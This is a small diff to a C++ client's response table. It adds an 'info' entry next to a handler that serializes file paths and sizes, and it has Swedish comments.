@@ -19,7 +19,8 @@ response_table client::get_responses()
 				serilized += path.string() + "*" + std::to_string(size) + "|"; // to string för att ignorera locale vid utskrivning av nummer tex med locale blir 1000 -> 1,000
 			}
 			return serilized.substr(0, serilized.length() - 1); // ta bort sista |
-		}}
+		}},
+		{"info", payload::info}
 	};
 }
 
